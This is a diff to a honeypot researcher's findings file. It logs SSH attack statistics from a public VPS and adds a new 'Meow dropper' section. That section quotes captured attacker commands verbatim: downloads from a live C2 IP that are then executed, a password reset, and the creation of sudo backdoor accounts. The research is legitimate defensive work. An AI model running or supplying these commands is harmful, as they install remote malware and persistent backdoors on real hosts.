@@ -1,13 +1,13 @@
-# Findings -- 97h on a public VPS
+# Findings -- 121h on a public VPS
 
 Helsinki VPS, port 22, fresh IP, no prior reputation.
-Data: 2026-05-26 11:32 UTC to 2026-05-30 13:27 UTC.
+Data: 2026-05-26 11:37 UTC to 2026-05-31 12:52 UTC.
 
 ```
-3317 auth attempts
- 183 unique source IPs
-1928 unique passwords tried
- 529 sessions accepted
+3514 auth attempts
+ 204 unique source IPs
+ 726 sessions accepted
+ 11 attack families identified
 ```
 
 ---
@@ -17,11 +17,12 @@ Data: 2026-05-26 11:32 UTC to 2026-05-30 13:27 UTC.
 Not continuous. Two big waves, one quiet day.
 
 ```
-2026-05-26   88 commands  -- first bots, mixed families
-2026-05-27  545 commands  -- Diicot heavy day
-2026-05-28   10 commands  -- quiet
-2026-05-29   90 commands  -- threshold=1 deployed, new families appear
-2026-05-30  43342 commands -- family 10 live session, 78min, 4 binaries
+2026-05-26    88 commands  -- first bots, mixed families
+2026-05-27   545 commands  -- Diicot heavy day
+2026-05-28    10 commands  -- quiet
+2026-05-29   195 commands  -- threshold=1 deployed, new families appear
+2026-05-30  60453 commands  -- family 10 first session, 78min, 4 binaries
+2026-05-31  64772 commands  -- family 10 again, family 11 first appearance
 ```
 
 Peak: 22:00 UTC, 1270 attempts in one hour (2026-05-27).
@@ -262,6 +263,39 @@ was deleted. 43,058 echo commands total.
 Binary analysis pending -- all four recoverable from session.log hex chunks, also
 downloadable from the C2 servers (still live as of 2026-05-30). Haven't done the
 Ghidra work yet.
+
+Hit a second time on 2026-05-31. Same kill chain, same C2 IPs, but path changed
+from `/b/amd64` to `/s/amd64`. Same four binaries in the same order. C2 still live.
+
+---
+
+### 11. Meow dropper -- backdoor + credential harvesting
+
+Two hits 2026-05-31 01:09 and 01:12 UTC, from different IPs, same C2 at 34.11.111.237.
+
+```bash
+cd /tmp; ulimit -n 1020000; rm -rf meow*
+wget http://34.11.111.237/meow; chmod 777 meow; ./meow
+wget http://34.11.111.237/meowarm64; chmod 777 meowarm64; ./meowarm64
+echo $(whoami):modzmodz | chpasswd
+useradd -m -s /bin/bash admin1; echo admin1:modzmodz | chpasswd; usermod -aG sudo admin1
+useradd -m -s /bin/bash user1; echo user1:modzmodz | chpasswd
+echo -n 'root:webserver' > /tmp/mew
+```
+
+Drops both x86-64 and ARM64 binaries in one shot -- covers both architectures without
+checking first. Creates two persistent backdoor users (admin1, user1) both with sudo.
+Changes the current user's password to `modzmodz` too.
+
+The `/tmp/mew` line is the tell: writing a credential string to a predictable path.
+The second hit had `root:fuck123` instead of `root:webserver` -- same tool, different
+parameter. Either two operators sharing the same infrastructure, or a parameterized
+campaign where each node gets a different credential to harvest.
+
+Entire kill chain in a single command, run via SSH exec channel (not interactive shell).
+No recon, no persistence check -- just drop, execute, and leave.
+
+Binary analysis not done yet. What `meow` actually does is unknown.
 
 ---
 
